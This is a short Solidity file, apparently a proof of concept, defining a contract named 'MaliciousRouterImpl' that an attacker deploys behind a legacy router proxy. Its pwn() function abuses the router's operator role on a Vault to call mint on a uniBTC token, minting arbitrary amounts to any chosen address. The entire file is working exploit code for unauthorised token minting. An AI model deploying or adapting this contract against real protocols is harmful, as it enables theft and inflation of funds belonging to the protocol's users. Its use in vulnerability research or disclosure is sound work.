// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

interface IVault { function execute(address target, bytes memory data, uint256 value) external returns (bytes memory); }

/// Minimal implementation an attacker could deploy behind the legacy router proxy.
/// It keeps no legacy storage layout assumptions beyond exposing one function that
/// routes an arbitrary call through the Vault, which the router is an OPERATOR of.
contract MaliciousRouterImpl {
    function pwn(address vault, address uniBTC, address to, uint256 amount) external {
        bytes memory mintCall = abi.encodeWithSignature("mint(address,uint256)", to, amount);
        IVault(vault).execute(uniBTC, mintCall, 0);
    }
}
